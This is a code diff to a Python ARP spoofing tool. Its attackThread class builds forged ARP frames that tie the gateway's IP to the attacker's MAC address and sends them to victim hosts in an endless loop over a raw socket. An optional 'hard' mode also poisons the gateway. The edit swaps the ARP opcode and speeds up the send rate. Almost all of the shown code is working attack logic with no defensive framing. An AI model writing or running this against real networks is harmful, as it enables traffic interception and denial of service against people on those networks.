@@ -28,39 +28,30 @@ s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
 
 
 class attackThread(threading.Thread):
-	def __init__(self, gateway, victim, mac, connect, hard):
+	def __init__(self, victim, gateway,  mac, connect):
 		threading.Thread.__init__(self)
 		self.victim = victim
 		self.gateway = gateway
 		self.mac = self.encode_mac(mac)
 		self.connect = connect
-		self.hard = hard
 
 		# Other
 		self.arp = b'\x08\x06'  # Code ARP protocol
-		self.protocol = b'\x00\x01\x08\x00\x06\x04\x00\x02'  # ARP packet
+		self.protocol = b'\x00\x01\x08\x00\x06\x04\x00\x01'  # ARP packet
 
 	def run(self):
 		victim_mac = self.get_mac(self.victim)
-		gateway_mac = self.get_mac(self.gateway)
-
-		epacket1 = victim_mac + self.mac + self.arp
-		epacket2 = gateway_mac + self.mac + self.arp
+		epacket = victim_mac + self.mac + self.arp
 
 		gip = socket.inet_aton(self.gateway)
 		vip = socket.inet_aton(self.victim)
 
-		victim_arp = epacket1 + self.protocol + self.mac + gip + victim_mac + vip
-		gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
+		request = epacket + self.protocol + self.mac + gip + victim_mac + vip
 
 		while True:
-			self.connect.send(victim_arp)
-			print("packet send to " + self.victim)
-
-			if self.hard:
-				self.connect.send(gateway_arp)
-
-			time.sleep(1.5)
+			self.connect.send(request)
+			print("ARP packet send to " + self.victim + " (0x0806), operation code 0x0001")
+			time.sleep(0.3)
 
 
 	def get_mac(self, local_ip):
@@ -83,8 +74,11 @@ class attackThread(threading.Thread):
 def attack(ips):
 	global threads, mac, gateway_ip, hard
 
-	for ip in ips:
-		threads.append(attackThread(gateway_ip, ip, mac, s, hard))
+	for victim_ip in ips:
+		threads.append(attackThread(victim_ip, gateway_ip, mac, s))
+		time.sleep(0.4)
+		if hard:
+			threads.append(attackThread(gateway_ip, victim_ip, mac, s))
 
 	for th in threads:
 		th.start()
@@ -183,13 +177,13 @@ def scanner(ip):
 
 
 def get_mac(interface):
-    iface = netifaces.ifaddresses(interface)[netifaces.AF_LINK]
-    return iface[0]["addr"]
+	iface = netifaces.ifaddresses(interface)[netifaces.AF_LINK]
+	return iface[0]["addr"]
 
 
 def get_local_ip(interface):
-    iface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
-    return iface[0]["addr"]
+	iface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
+	return iface[0]["addr"]
 
 
 def check_ip(ip):
